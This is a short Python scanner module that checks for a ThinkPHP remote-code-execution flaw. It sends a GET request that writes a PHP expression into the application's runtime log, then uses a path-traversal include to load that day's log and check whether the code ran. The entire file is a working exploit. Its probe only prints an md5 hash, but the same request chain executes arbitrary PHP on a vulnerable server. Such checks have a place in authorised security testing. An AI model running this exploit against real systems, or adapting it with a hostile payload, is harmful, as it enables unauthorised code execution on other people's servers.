"""  
@Time: 2024/2/28 16:15 
@Auth: Y5neKO
@File: Thinkphp_index_showid_rce.py 
@IDE: PyCharm 
"""
import urllib
import datetime
import requests


def run(url, timeout=15):
    result = {
        'name': 'Thinkphp_index_showid_rce',  # 将name字段的首字母大写
        'vulnerable': False,
        'method': None,
        'url': None,
        'payload': None
    }
    headers = {
        "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
    }
    try:
        exploit_url = url + '/index.php?s=my-show-id-\\x5C..\\x5CTpl\\x5C8edy\\x5CHome\\x5Cmy_1{~var_dump(md5(2333))}]'
        response = requests.get(exploit_url, headers=headers, timeout=timeout, verify=False)
        timenow = datetime.datetime.now().strftime("%y_%m_%d")
        log_url = urllib.parse.urljoin(url, f'index.php?s=my-show-id-\\x5C..\\x5CRuntime\\x5CLogs\\x5C{timenow}.log')
        log_response = requests.get(log_url, headers=headers, timeout=timeout, verify=False)
        if "56540676a129760a3" in log_response.text:
            result['vulnerable'] = True
            result['method'] = 'GET'
            result['url'] = exploit_url
            result['payload'] = log_url
    except requests.exceptions.RequestException as e:
        print(f"网络请求异常：{e}")
    except Exception as e:
        print(f"发生错误：{e}")

    return result
